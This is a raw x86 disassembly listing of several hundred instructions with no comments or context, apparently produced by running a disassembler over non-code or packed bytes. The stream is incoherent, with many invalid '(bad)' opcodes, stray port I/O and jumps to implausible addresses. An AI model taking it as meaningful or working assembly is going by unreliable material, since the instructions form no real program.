  428dfa:	pop    edx
  428dfb:	pop    edx
  428dfc:	inc    ecx
  428dfd:	in     al,dx
  428dfe:	lods   al,BYTE PTR ds:[esi]
  428dff:	ja     0x428e5f
  428e01:	mov    edx,0x25e5eaba
  428e06:	xchg   BYTE PTR [ebp+0x53],al
  428e09:	popa   
  428e0a:	add    bl,BYTE PTR [ebx+ebx*4]
  428e0d:	daa    
  428e0e:	dec    eax
  428e0f:	xchg   ebp,eax
  428e10:	aaa    
  428e11:	sbb    dh,ch
  428e13:	iret   
  428e14:	sbb    al,0x29
  428e16:	pop    es
  428e17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e18:	xor    DWORD PTR [edx],esi
  428e1a:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e1c:	mov    edi,0xbb679e0c
  428e21:	mov    al,ds:0x58cda046
  428e26:	out    dx,al
  428e27:	fnstcw WORD PTR [esi-0x2361f5e3]
  428e2d:	mov    esp,cs
  428e2f:	mov    al,ds:0xca43fb9f
  428e34:	dec    ecx
  428e35:	icebp  
  428e36:	cwde   
  428e37:	pop    es
  428e38:	pop    edi
  428e39:	sar    DWORD PTR [edx+0x6c],cl
  428e3c:	jmp    0xdbb388c2
  428e41:	ins    DWORD PTR es:[edi],dx
  428e42:	in     al,0xa0
  428e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e45:	test   BYTE PTR [ebp-0x147f6a7c],0x39
  428e4c:	dec    ebx
  428e4d:	push   0x11
  428e4f:	or     bl,BYTE PTR [esi+0xb]
  428e52:	cwde   
  428e53:	xchg   esi,eax
  428e54:	fistp  QWORD PTR [edi-0x60]
  428e57:	test   al,0xd7
  428e59:	aad    0x8e
  428e5b:	adc    eax,0xd5cfb0a3
  428e60:	into   
  428e61:	sbb    eax,0xe4fad225
  428e66:	mov    esi,0xe6df5fea
  428e6b:	pop    ebx
  428e6c:	mov    ds:0x13396242,al
  428e71:	pop    edx
  428e72:	push   ebp
  428e73:	mov    eax,ds:0x5ee3a427
  428e78:	adc    BYTE PTR [ecx],0xfe
  428e7b:	neg    DWORD PTR [esi+0x3f126576]
  428e81:	jge    0x428e91
  428e83:	repnz out 0xaa,eax
  428e86:	sub    DWORD PTR [ecx-0x7cebb9b1],esp
  428e8c:	loope  0x428e58
  428e8e:	repz pop esp
  428e90:	pop    esi
  428e91:	fs mov esp,0xdf39c6a3
  428e97:	dec    esi
  428e98:	cmp    eax,DWORD PTR [edx+0x2f]
  428e9b:	push   cs
  428e9c:	and    DWORD PTR fs:[edx+0x518f22b4],edx
  428ea3:	mov    ebx,DWORD PTR [esi-0x57]
  428ea6:	(bad)  
  428ea8:	sub    eax,0xd358dfdf
  428ead:	and    al,0xc9
  428eaf:	ins    BYTE PTR es:[edi],dx
  428eb0:	das    
  428eb1:	popa   
  428eb2:	pop    ds
  428eb3:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428eb5:	sub    BYTE PTR [edx+0x68],dl
  428eb8:	cmp    cl,BYTE PTR [edi+0x48]
  428ebb:	(bad)  
  428ebc:	pop    esi
  428ebd:	aam    0xa6
  428ebf:	cmp    eax,edi
  428ec1:	add    dl,al
  428ec3:	test   eax,0x77406137
  428ec8:	stos   DWORD PTR es:[edi],eax
  428ec9:	lods   al,BYTE PTR ds:[esi]
  428eca:	adc    al,0xb2
  428ecc:	cmp    ch,BYTE PTR [edx]
  428ece:	dec    esi
  428ecf:	xor    DWORD PTR [ebp-0x48],ebx
  428ed2:	xchg   ebp,eax
  428ed3:	xchg   edx,eax
  428ed4:	gs mov dh,0xbf
  428ed7:	pop    ebp
  428ed8:	mov    gs,WORD PTR [eax]
  428eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428edb:	mov    eax,ds:0x9c5f4f3
  428ee0:	sar    DWORD PTR [esi*1+0x41675bd5],cl
  428ee7:	jg     0x428f4d
  428ee9:	loop   0x428ed9
  428eeb:	aas    
  428eec:	mov    dh,0x56
  428eee:	cli    
  428eef:	mov    al,ds:0x22f37e06
  428ef4:	sub    BYTE PTR [edi+0x1a],bh
  428ef7:	into   
  428ef8:	pop    esi
  428ef9:	sbb    DWORD PTR [ebx+0x3a],edi
  428efc:	jbe    0x428ee3
  428efe:	loope  0x428f4a
  428f00:	(bad)  
  428f01:	inc    ebx
  428f02:	jne    0x428f02
  428f04:	xlat   BYTE PTR ds:[ebx]
  428f05:	and    BYTE PTR [edi+0xe],cl
  428f08:	push   esi
  428f09:	push   es
  428f0a:	out    0xa7,al
  428f0c:	push   esp
  428f0d:	scas   eax,DWORD PTR es:[edi]
  428f0e:	xchg   ebx,eax
  428f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f10:	mov    ds:0xcb215ee6,eax
  428f15:	dec    ebp
  428f16:	inc    edi
  428f17:	retf   
  428f18:	pop    ds
  428f19:	popa   
  428f1a:	icebp  
  428f1b:	push   cs
  428f1c:	add    BYTE PTR [ebx+0x70],cl
  428f1f:	imul   ebp,DWORD PTR [ecx],0xc7daeecb
  428f25:	ins    DWORD PTR es:[edi],dx
  428f26:	add    eax,0xf5b29441
  428f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f2c:	fcom   QWORD PTR [ebx+ebx*2-0x34]
  428f30:	imul   esp,eax,0xffffffb9
  428f33:	add    edi,DWORD PTR [edi-0x4d]
  428f36:	out    dx,al
  428f37:	jmp    0x428f77
  428f39:	lods   eax,DWORD PTR ds:[esi]
  428f3a:	dec    ebp
  428f3b:	pusha  
  428f3c:	xchg   edi,eax
  428f3d:	mov    DWORD PTR [ebx],0x56f41ba1
  428f43:	pop    ecx
  428f44:	imul   edx,DWORD PTR [ebx+0x15],0xeed978fe
  428f4b:	je     0x428f0d
  428f4d:	leave  
  428f4e:	loope  0x428f7b
  428f50:	dec    ebp
  428f51:	adc    al,0x54
  428f53:	mov    eax,ds:0x3a56b96d
  428f58:	mov    esp,0x5e2b3cdd
  428f5d:	jbe    0x428fa0
  428f5f:	jbe    0x428fc7
  428f61:	cs jmp 0x428f2e
  428f64:	pop    ecx
  428f65:	mov    edi,0xc4f7a834
  428f6a:	jne    0x428f6c
  428f6c:	loop   0x428fce
  428f6e:	push   cs
  428f6f:	loope  0x428f66
  428f71:	mov    bl,0x60
  428f73:	jno    0x428fd3
  428f75:	xor    ebp,DWORD PTR [ebp+0x78eb3cd0]
  428f7b:	in     eax,0xb1
  428f7d:	pusha  
  428f7e:	mov    ds:0x56d3ea96,eax
  428f83:	push   ss
  428f84:	xchg   ecx,eax
  428f85:	add    al,0xff
  428f87:	mov    ds:0xcdeda840,al
  428f8c:	jns    0x428fa2
  428f8e:	inc    ebp
  428f8f:	(bad)  
  428f90:	out    dx,al
  428f91:	shl    BYTE PTR [ecx+eiz*4],cl
  428f94:	xor    DWORD PTR [edx-0x620cfd64],ebx
  428f9a:	(bad)  
  428f9b:	sbb    edx,DWORD PTR [eax+eiz*4-0x7]
  428f9f:	mov    ebx,DWORD PTR [esi]
  428fa1:	icebp  
  428fa2:	fsubrp st(6),st
  428fa5:	sub    eax,edx
  428fa7:	mov    al,ds:0xf52e4168
  428fac:	inc    esp
  428fad:	shr    DWORD PTR [ecx-0x4730a039],0xc9
  428fb4:	jbe    0x428f5a
  428fb6:	and    eax,0x4d38af41
  428fbb:	xchg   DWORD PTR [ecx+0x10a0ad2b],eax
  428fc1:	loope  0x42901c
  428fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fc4:	xchg   edx,eax
  428fc5:	mov    eax,ds:0x2122b7b6
  428fca:	fldenv [eax+0xef35d16]
  428fd0:	shl    DWORD PTR [ebp-0xe],cl
  428fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fd4:	lea    edi,[edi+esi*2-0x455f6724]
  428fdb:	addr16 mov dh,0x77
  428fde:	in     eax,dx
  428fdf:	pop    esi
  428fe0:	mov    ch,0x76
  428fe2:	outs   dx,BYTE PTR ds:[esi]
  428fe3:	and    eax,0xa6563190
  428fe8:	test   DWORD PTR [eax-0x77],esp
  428feb:	les    edi,FWORD PTR [ecx-0x6b]
  428fee:	(bad)  
  428fef:	leave  
  428ff0:	sahf   
  428ff1:	adc    al,0xee
  428ff3:	mov    ebx,0x35a551c8
  428ff8:	rcr    eax,cl
  428ffa:	mov    al,0xa0
  428ffc:	test   DWORD PTR ds:0x867bf0b6,0xd86378cb
  429006:	or     edx,DWORD PTR [ebx-0x5685beed]
  42900c:	or     BYTE PTR [eax],ch
  42900e:	(bad)  
  42900f:	mov    eax,ds:0x62b80a09
  429014:	dec    edx
  429015:	pop    ecx
  429016:	mov    ds:0x35ce5ead,eax
  42901b:	mov    ds:0x610c1f56,eax
  429020:	call   0xb4785a7e
  429025:	dec    ebp
  429026:	call   0x5ff9:0xb36606d1
  42902d:	jmp    0x428fd3
  42902f:	fist   WORD PTR [esi+0x6e629c4a]
  429035:	(bad)  
  429037:	loopne 0x429008
  429039:	pusha  
  42903a:	jns    0x429086
  42903c:	(bad)  
  42903d:	cmp    esp,esp
  42903f:	add    ah,BYTE PTR [edx+eiz*2-0x12]
  429043:	mov    dh,0x99
  429045:	addr16 ja 0x42902f
  429048:	mov    ds:0xd6a1a1dd,eax
  42904d:	mov    al,ds:0x8e4b8e19
  429052:	jge    0x42904f
  429054:	pop    esi
  429055:	pop    ebp
  429056:	jo     0x429032
  429058:	xor    BYTE PTR [edi],cl
  42905a:	xchg   esp,eax
  42905b:	ret    
  42905c:	push   cs
  42905d:	popa   
  42905e:	enter  0x57de,0x55
  429062:	xchg   edi,eax
  429063:	paddd  mm4,QWORD PTR [esi+ebp*8+0x56]
  429068:	test   ebp,esp
  42906a:	jmp    0x429006
  42906c:	push   ecx
  42906d:	mov    eax,ds:0xcb0ca232
  429072:	je     0x429067
  429074:	out    0x87,eax
  429076:	push   ds
  429077:	popa   
  429078:	mov    al,0x5
  42907a:	out    dx,al
  42907b:	xchg   edi,eax
  42907c:	in     al,dx
  42907d:	fmul   QWORD PTR [eax+0x7910d852]
  429083:	mov    eax,ds:0x99ecbcde
  429088:	daa    
  429089:	jp     0x42902e
  42908b:	xchg   ebp,eax
  42908c:	pop    ebx
  42908d:	test   esi,edx
  42908f:	call   esp
  429091:	mov    ds:0x2c52fafe,eax
  429096:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429098:	xchg   ebx,eax
  429099:	push   ebp
  42909a:	jbe    0x4290ea
  42909c:	jge    0x429113
  42909e:	outs   dx,BYTE PTR ds:[esi]
  42909f:	nop
  4290a0:	(bad)  
  4290a1:	das    
  4290a2:	cmc    
  4290a3:	test   DWORD PTR [esi-0x5753999e],ebx
  4290a9:	mov    al,0xe
  4290ab:	mov    cl,0xab
  4290ad:	mov    al,BYTE PTR [edx-0x24]
  4290b0:	pop    es
  4290b1:	aaa    
  4290b2:	out    dx,al
  4290b3:	mov    bl,0x9
  4290b5:	mov    eax,0xd6320633
  4290ba:	adc    al,0xec
  4290bc:	mov    ds:0xfa761744,al
  4290c1:	and    bh,dl
  4290c3:	push   ebx
  4290c4:	aad    0x93
  4290c6:	inc    esp
  4290c7:	rcr    DWORD PTR [esi-0x36],0x1c
  4290cb:	xchg   esp,eax
  4290cc:	xchg   ebx,eax
  4290cd:	lock jo 0x429099
  4290d0:	call   0xf00acb3d
  4290d5:	scas   al,BYTE PTR es:[edi]
  4290d6:	sub    esp,DWORD PTR [ecx+0x26b7a985]
  4290dc:	push   ds
  4290dd:	cwde   
  4290de:	ss aam 0x5e
  4290e1:	xchg   ecx,eax
  4290e2:	and    eax,0x625d2c01
  4290e7:	mov    dl,0x7
  4290e9:	pusha  
  4290ea:	sub    eax,0xe0ce9964
  4290ef:	xor    BYTE PTR [edi+0x40],bh
  4290f2:	test   BYTE PTR [esi],0xea
  4290f5:	arpl   WORD PTR [ecx],ax
  4290f7:	call   0xb63a:0xea6e4ec3
  4290fe:	jmp    DWORD PTR [eax+edi*8-0x52d990a0]
  429105:	mov    bl,0xcd
  429107:	push   esi
  429108:	mov    al,ds:0xec5deaa9
  42910d:	xor    BYTE PTR [ebp-0x5f43613f],dl
  429113:	mov    ebp,0x388f6095
  429118:	and    edx,edx
  42911a:	ret    0x4c4
  42911d:	(bad)  
  42911e:	out    dx,al
  42911f:	mov    cl,BYTE PTR [esi-0x9852a47]
  429125:	or     eax,0x72826986
  42912a:	outs   dx,BYTE PTR ss:[esi]
  42912c:	(bad)  
  42912d:	pusha  
  42912e:	and    al,0x89
  429130:	pop    edx
  429131:	inc    ebp
  429132:	test   edi,0xdb8b4e2e
  429138:	and    ecx,DWORD PTR [edi]
  42913a:	inc    edi
  42913b:	mov    eax,ds:0x3300ac31
  429140:	mov    ebp,0x5eba01fa
  429145:	push   esp
  429146:	mov    esi,0x8c02d1ea
  42914b:	mov    al,0xca
  42914d:	pusha  
  42914e:	ins    DWORD PTR es:[edi],dx
  42914f:	adc    al,0x4f
  429151:	stos   DWORD PTR es:[edi],eax
  429152:	repz adc cl,BYTE PTR [edi-0x4b7f1154]
  429159:	arpl   WORD PTR [esi+0x5],dx
  42915c:	xchg   edx,eax
  42915d:	loope  0x429146
  42915f:	mov    al,ds:0xd6257dec
  429164:	cmp    eax,0x5dc75909
  429169:	pop    ds
  42916a:	add    DWORD PTR [ebx],ebp
  42916c:	jmp    0x7f37627f
  429171:	gs (bad) 
  429173:	sahf   
  429174:	repnz shl bl,1
  429177:	xchg   esi,eax
  429178:	fidivr WORD PTR [ebx-0x3e268ee8]
  42917e:	loope  0x429139
  429180:	pop    esi
  429181:	in     al,0x2a
  429183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429184:	fsub   DWORD PTR [ecx-0x4]
  429187:	push   0xdc0b51dc
  42918c:	js     0x42918b
  42918e:	into   
  42918f:	mov    ah,0x67
  429191:	or     al,0x88
  429193:	out    dx,al
  429194:	push   0x22efca3a
  429199:	enter  0xfeee,0xad
  42919d:	fcom   st(3)
  42919f:	iret   
  4291a0:	xchg   edx,eax
  4291a1:	jl     0x42920e
  4291a3:	and    dl,BYTE PTR [ecx]
  4291a5:	push   0x439d7381
  4291aa:	xchg   ecx,eax
  4291ab:	outs   dx,DWORD PTR ds:[esi]
  4291ac:	ficomp WORD PTR [ebx+0x753f1b93]
  4291b2:	stc    
  4291b3:	or     edx,esi
  4291b5:	pop    esp
  4291b6:	out    dx,al
  4291b7:	fisub  WORD PTR [ebx+edi*2-0x7a]
  4291bb:	(bad)  
  4291bc:	or     ch,BYTE PTR [eax]
  4291be:	call   0xa1a7:0x922f0831
  4291c5:	mov    dh,0x2a
  4291c7:	cmp    ch,BYTE PTR [ebp+0x739702ae]
  4291cd:	dec    ebx
  4291ce:	outs   dx,DWORD PTR ds:[esi]
  4291cf:	out    dx,al
  4291d0:	rcr    dx,0xff
  4291d4:	adc    ch,ch
  4291d6:	mul    DWORD PTR [ebx+0x62f01a78]
  4291dc:	(bad)  
  4291dd:	mov    ds:0xd234505e,eax
  4291e2:	out    dx,al
  4291e3:	ret    
  4291e4:	push   ds
  4291e5:	ds adc dh,ch
  4291e8:	cdq    
  4291e9:	repz push ss
  4291eb:	mov    eax,ds:0x2afb2be0
  4291f0:	jae    0x42921b
  4291f2:	dec    esi
  4291f3:	jecxz  0x42924e
  4291f5:	pop    edi
  4291f6:	je     0x429254
  4291f8:	int3   
  4291f9:	or     DWORD PTR ds:0x4a588eec,ebp
  4291ff:	cmc    
  429200:	leave  
  429201:	pusha  
  429202:	mov    ebx,0x18323329
  429207:	in     eax,dx
  429208:	sbb    ebx,edx
  42920a:	out    dx,al
  42920b:	popa   
  42920c:	push   ebp
  42920d:	fadd   DWORD PTR [edx-0x62]
  429210:	mov    cl,0xad
  429213:	mov    ds:0xec3abe4a,eax
  429218:	jnp    0x429232
  42921a:	xor    eax,0x378c7ad8
  42921f:	add    DWORD PTR [edx-0x63],ebp
  429222:	push   eax
  429223:	outs   dx,BYTE PTR ds:[esi]
  429224:	arpl   WORD PTR [eax+0x4103bf4c],cx
  42922a:	fs cmp eax,0xa138e6f2
  429230:	sub    edx,0x7b
  429233:	or     eax,0xf4af6ff7
  429238:	push   ecx
  429239:	retf   0x7575
  42923c:	test   BYTE PTR [edx-0x76],0xac
  429240:	fimul  WORD PTR [ebp-0x57]
  429243:	stc    
  429244:	adc    ecx,esp
  429246:	jge    0x4291e9
  429248:	mov    dh,0xee
  42924a:	dec    ecx
  42924b:	(bad)  
  42924c:	iret   
  42924d:	xor    dl,BYTE PTR [ecx]
  42924f:	or     eax,0x76ef03f0
  429254:	push   edx
  429255:	push   ebp
  429256:	pop    esp
  429257:	shl    DWORD PTR [edx],0x26
  42925a:	xchg   edx,eax
  42925b:	xchg   esp,eax
  42925c:	sbb    eax,0x302fa661
  429261:	ja     0x42925a
  429263:	push   DWORD PTR [edx+0x3dd123c7]
  429269:	pusha  
  42926a:	sub    edi,0x59
  42926d:	jo     0x4292b7
  42926f:	stos   BYTE PTR es:[edi],al
  429270:	cs adc eax,0xb9bead15
  429276:	outs   dx,BYTE PTR ds:[esi]
  429277:	mul    BYTE PTR [ecx+0x6d3eef90]
  42927d:	mov    eax,ds:0x2b2528ff
  429282:	cs push eax
  429284:	or     al,0x6f
  429286:	outs   dx,BYTE PTR ds:[esi]
  429287:	aad    0xe4
  429289:	pusha  
  42928a:	lods   al,BYTE PTR ds:[esi]
  42928b:	out    0x49,eax
  42928d:	and    al,0x9d
  42928f:	adc    ebx,DWORD PTR [ecx+eiz*4]
  429292:	out    dx,al
  429293:	stos   BYTE PTR es:[edi],al
  429294:	sti    
  429295:	add    eax,0x32c948b2
  42929a:	push   0x76eaeca1
  42929f:	sbb    BYTE PTR [ebx+0x5d67651d],bh
  4292a5:	push   esp
  4292a6:	sbb    BYTE PTR [esi-0x15eb430d],ah
  4292ac:	jle    0x4292e4
  4292ae:	adc    edx,esi
  4292b0:	in     eax,dx
  4292b1:	inc    esp
  4292b2:	jbe    0x42925e
  4292b4:	out    0xe0,eax
  4292b6:	add    ah,BYTE PTR [ebx-0x6cbfff44]
  4292bc:	pop    esi
  4292bd:	adc    eax,edx
  4292bf:	(bad)  
  4292c0:	adc    DWORD PTR [ebp-0x36],ecx
  4292c3:	sub    ebp,0x5d
  4292c6:	(bad)
  4292cb:	sub    bh,BYTE PTR [esi+0x5e5cd33a]
  4292d1:	pop    edx
  4292d2:	stos   DWORD PTR es:[edi],eax
  4292d3:	(bad)  
  4292d4:	sbb    al,0x2e
  4292d6:	push   ds
  4292d7:	cmp    eax,0x5c506099
  4292dc:	fs (bad) 
  4292de:	(bad)  
  4292e0:	arpl   WORD PTR [edx-0x8f35e5f],bp
  4292e6:	mov    ds:0x47e8c9ca,eax
  4292eb:	mov    eax,ds:0xa2fea030
  4292f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4292f1:	aaa    
  4292f2:	addr16 dec ecx
  4292f4:	pop    esi
  4292f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292f6:	aam    0x6d
  4292f8:	sti    
  4292f9:	clc    
  4292fa:	ds inc edx
  4292fc:	pop    ebp
  4292fd:	pop    edx
  4292fe:	inc    edi
  4292ff:	in     al,0x32
  429301:	inc    ebp
  429302:	cmp    edx,edx
  429304:	data16 cmp BYTE PTR ds:0xe7558171,0x9f
  42930c:	vxorps xmm5,xmm0,xmm4
  429310:	pop    esi
  429311:	inc    edx
  429312:	mov    ds,WORD PTR [edi+0x6f8d60f1]
  429318:	xor    al,0xec
  42931a:	lods   eax,DWORD PTR ds:[esi]
  42931b:	xchg   ebp,eax
  42931c:	mov    al,0x10
  42931e:	out    dx,al
  42931f:	xchg   edi,eax
  429320:	shr    BYTE PTR [edi],1
  429322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429323:	pushf  
  429324:	mov    ecx,0xb6a0c0a7
  429329:	nop
  42932a:	and    DWORD PTR [ecx-0x59],0x63
  42932e:	pop    ebx
  42932f:	pushw  ss
  429331:	sar    BYTE PTR ds:0x1db682a1,0xf
  429338:	popf   
  429339:	cdq    
  42933a:	mov    ebp,0x696f34a0
  42933f:	in     al,0x2f
  429341:	or     eax,0x5d633878
  429346:	xchg   ebx,eax
  429347:	popa   
  429348:	js     0x4293aa
  42934a:	mov    eax,ds:0x52a8071f
  42934f:	(bad)
  429352:	stos   DWORD PTR es:[edi],eax
  429353:	mov    ds:0x79dd584b,al
  429358:	popf   
  429359:	mov    ebx,0x6330751f
  42935e:	out    dx,al
  42935f:	xchg   bh,ah
  429361:	cld    
  429362:	sub    dh,cl
  429364:	test   eax,0xc3ed25d4
  429369:	pusha  
  42936a:	mov    ebx,0xdf1f7ab4
  42936f:	pop    esp
  429370:	cmp    eax,0xc098eed7
  429375:	not    DWORD PTR [ebx+0x478c684]
  42937b:	mov    eax,ds:0xbb56f6d6
  429380:	sbb    al,0x71
  429382:	aaa    
  429383:	lods   al,BYTE PTR ds:[esi]
  429384:	pop    ebp
  429385:	pop    edi
  429386:	and    eax,0x71082dd5
  42938b:	test   BYTE PTR [edx+0x13a0e843],cl
  429391:	cmp    al,0xb4
  429393:	xchg   ebp,eax
  429394:	pop    ecx
  429395:	jnp    0x429388
  429397:	pop    esi
  429398:	pop    esi
  429399:	mov    edi,0x8227fafc
  42939e:	xor    ecx,DWORD PTR es:[eax+0x4b93e560]
  4293a5:	mov    eax,ds:0xe599369b
  4293aa:	in     eax,dx
  4293ab:	dec    edx
  4293ac:	push   cs
  4293ad:	sbb    BYTE PTR [eax+0x425ca78f],ah
  4293b3:	adc    al,0x62
  4293b5:	push   edx
  4293b6:	shl    BYTE PTR [esi],cl
  4293b8:	fwait
  4293b9:	cmp    esi,DWORD PTR [ebx]
  4293bb:	sbb    esi,ebx
  4293bd:	ins    DWORD PTR es:[edi],dx
  4293be:	push   ss
  4293bf:	imul   edx,DWORD PTR [ebp+0x7e],0xffffffee
  4293c3:	mov    ebp,0x29921e96
  4293c8:	pop    eax
  4293c9:	and    edx,DWORD PTR [eax-0x5f]
  4293cc:	loope  0x4293de
  4293ce:	dec    esp
  4293cf:	ins    BYTE PTR es:[edi],dx
  4293d0:	dec    eax
  4293d1:	das    
  4293d2:	pop    edx
  4293d3:	sbb    BYTE PTR [esi+0x8],bl
  4293d6:	fsubr  DWORD PTR [esi+0x9]
  4293d9:	cmp    bh,bl
  4293db:	aaa    
  4293dc:	imul   esp,DWORD PTR [eax-0x22],0x22
  4293e0:	fimul  WORD PTR [ecx+0x19]
  4293e3:	in     eax,dx
  4293e4:	cmp    bh,cl
  4293e6:	mov    ?,WORD PTR [ecx]
  4293e8:	in     eax,dx
  4293e9:	xchg   esp,eax
  4293ea:	out    dx,al
  4293eb:	inc    ebp
  4293ec:	out    dx,eax
  4293ed:	mov    bl,bh
  4293ef:	inc    esi
  4293f0:	dec    edi
  4293f1:	xor    al,0x59
  4293f3:	test   al,0xa4
  4293f5:	sbb    BYTE PTR [ebx-0x17],ch
  4293f8:	sbb    BYTE PTR [ecx+0x6],al
  4293fb:	dec    edx
  4293fc:	dec    eax
  4293fd:	scas   eax,DWORD PTR es:[edi]
  4293fe:	jmp    0x429417
  429400:	lahf   
  429401:	cs pop eax
  429403:	push   eax
  429404:	mov    bh,0xf7
  429406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429407:	xchg   ecx,eax
  429408:	outs   dx,BYTE PTR ds:[esi]
  429409:	mov    DWORD PTR [edx],eax
  42940b:	mov    eax,ds:0x7cf96ba2
  429410:	stos   DWORD PTR es:[edi],eax
  429411:	jecxz  0x429486
  429413:	dec    esi
  429414:	imul   ebp
  429416:	bound  esp,QWORD PTR [ecx-0xd]
  429419:	loope  0x429409
  42941b:	outs   dx,DWORD PTR ds:[esi]
  42941c:	mov    esp,0xf98a96a5
  429421:	jge    0x4293a9
  429423:	mov    eax,ds:0xc614f142
  429428:	add    cl,BYTE PTR [edi]
  42942a:	js     0x4293b0
  42942c:	pop    esi
  42942d:	push   ss
  42942e:	das    
  42942f:	out    dx,eax
  429430:	shl    BYTE PTR [edi+0x26433018],0xd1
  429437:	xchg   BYTE PTR [edx+edx*2-0x3965f897],dl
  42943e:	scas   al,BYTE PTR es:[edi]
  42943f:	jmp    0x429407
  429441:	daa    
  429442:	sbb    eax,0xaaf65272
  429447:	adc    bl,BYTE PTR [esi+0x5f8a43c4]
  42944d:	shl    DWORD PTR [ecx],1
  42944f:	mov    eax,ds:0xcdce32e5
  429454:	xchg   ecx,eax
  429455:	jmp    0x4293f2
  429457:	jecxz  0x4293dd
  429459:	push   es
  42945a:	out    dx,al
  42945b:	addr16 dec ebp
  42945d:	cmp    DWORD PTR [eax],eax
  42945f:	fild   WORD PTR [ebx]
  429461:	jnp    0x429478
  429463:	leave  
  429464:	mov    ah,0x14
  429466:	out    dx,al
  429467:	or     eax,0xd21e718d
  42946c:	iret   
  42946d:	sub    dh,ch
  42946f:	aam    0x7f
  429471:	jae    0x4294b1
  429473:	jne    0x429456
  429475:	jns    0x42944c
  429477:	inc    eax
  429478:	fld    TBYTE PTR [ecx-0x6d]
  42947b:	mov    al,ds:0x771fa563
  429480:	mov    esi,0x78e937f8
  429485:	pop    es
  429486:	lock adc edx,DWORD PTR [edx]
  429489:	cwde   
  42948a:	fiadd  WORD PTR [eax]
  42948c:	(bad)  
  42948d:	fistp  QWORD PTR [ebp-0x28]
  429490:	xor    ah,BYTE PTR [ecx+0x2e]
  429493:	xchg   edi,eax
  429494:	dec    eax
  429495:	mov    bh,0x89
  429497:	nop
  429498:	push   0x14
  42949a:	pop    esp
  42949b:	add    dl,BYTE PTR [ecx-0x59]
  42949e:	jnp    0x4294d3
  4294a0:	sahf   
  4294a1:	xchg   edx,eax
  4294a2:	scas   eax,DWORD PTR es:[edi]
  4294a3:	int3   
  4294a4:	and    eax,0xc3a1b46b
  4294a9:	add    DWORD PTR [edi+0x1a],ecx
  4294ac:	nop
  4294ad:	mov    dl,0x35
  4294af:	jno    0x4294be
  4294b1:	jl     0x4294ff
  4294b3:	mov    ebx,0x6cdacf5e
  4294b8:	jge    0x429446
  4294ba:	cmp    esp,DWORD PTR [ecx+eiz*4]
  4294bd:	pusha  
  4294be:	int3   
  4294bf:	xlat   BYTE PTR ds:[ebx]
  4294c0:	test   BYTE PTR [edi],dh
  4294c2:	inc    edx
  4294c3:	popf   
  4294c4:	div    BYTE PTR [ebx]
  4294c6:	out    0x1b,eax
  4294c8:	xlat   BYTE PTR ds:[ebx]
  4294c9:	mov    eax,eax
  4294cb:	push   ss
  4294cc:	out    dx,al
  4294cd:	sub    al,0x44
  4294cf:	push   esp
  4294d0:	fiadd  WORD PTR [ecx-0x49]
  4294d3:	aad    0x19
  4294d5:	adc    esp,DWORD PTR [edx-0x4e6f211d]
  4294db:	sub    ebp,esi
  4294dd:	(bad)  
  4294de:	in     al,dx
  4294df:	mov    eax,ds:0x667ff574
  4294e4:	cmp    esp,DWORD PTR [ecx]
  4294e6:	pop    esi
  4294e7:	stc    
  4294e8:	mov    bl,0x60
  4294ea:	(bad)  
  4294ec:	push   eax
  4294ed:	pop    edi
  4294ee:	mov    ah,0x43
  4294f0:	push   esp
  4294f1:	les    eax,FWORD PTR [edx]
  4294f3:	stos   DWORD PTR es:[edi],eax
  4294f4:	xor    al,0x2d
  4294f6:	outs   dx,BYTE PTR ds:[esi]
  4294f7:	mov    ds:0x49b5068e,al
  4294fc:	loope  0x42955e
  4294fe:	call   0xbd667740
  429503:	add    BYTE PTR ds:0x3e37ee53,dl
  429509:	and    eax,0x7218e031
  42950e:	aad    0xa0
  429510:	gs jg  0x429573
  429513:	mov    eax,DWORD PTR [ebx+0x5eb59f1b]
  429519:	xor    eax,0x430184f9
  42951e:	push   ds
  42951f:	pop    ecx
  429520:	push   cs
  429521:	jne    0x429543
  429523:	(bad)  
  429524:	rcl    BYTE PTR [ecx+0x11],cl
  429527:	xchg   edi,eax
  429528:	pop    esi
  429529:	fstp   TBYTE PTR [edi+edi*1+0x7b]
  42952d:	popa   
  42952e:	out    dx,al
  42952f:	cmp    dl,bh
  429531:	outs   dx,DWORD PTR ds:[esi]
  429532:	mov    al,ds:0xce5887a8
  429537:	mov    al,ds:0x393f17ed
  42953c:	stos   DWORD PTR es:[edi],eax
  42953d:	push   0x265e368b
  429542:	push   edi
  429543:	popa   
  429544:	(bad)
  429548:	in     eax,0x59
  42954a:	inc    esi
  42954b:	repnz sbb bl,dl
  42954e:	cmp    eax,0x8f4faee1
  429553:	and    esp,DWORD PTR [eax-0x55]
  429556:	fadd   QWORD PTR [ebx+0x7f]
  429559:	and    ecx,esi
  42955b:	arpl   WORD PTR [esi-0x17],dx
  42955e:	mov    eax,0xc068aadd
  429563:	out    0xe0,eax
  429565:	(bad)  
  429566:	sahf   
  429567:	and    BYTE PTR [ebp-0x37a6b1d4],bh
  42956d:	mov    esp,0x34c072ee
  429572:	into   
  429573:	inc    ebp
  429574:	dec    esi
  429575:	xchg   esp,eax
  429576:	jg     0x429518
  429578:	aaa    
  429579:	cwde   
  42957a:	mov    bh,0x8
  42957c:	(bad)  
  42957d:	pop    ss
  42957e:	sti    
  42957f:	inc    edi
  429580:	sub    ebx,DWORD PTR ds:0x672744ed
  429586:	sub    al,BYTE PTR [ecx-0x6]
  429589:	push   ds
  42958a:	dec    esi
  42958b:	popa   
  42958c:	cs popa 
  42958e:	mul    BYTE PTR [esi]
  429590:	mov    ah,0xf2
  429592:	mov    edx,0xed40b597
  429597:	pushf  
  429598:	and    eax,0xb1036442
  42959d:	test   dh,cl
  42959f:	and    dl,ch
  4295a1:	pusha  
  4295a2:	inc    ecx
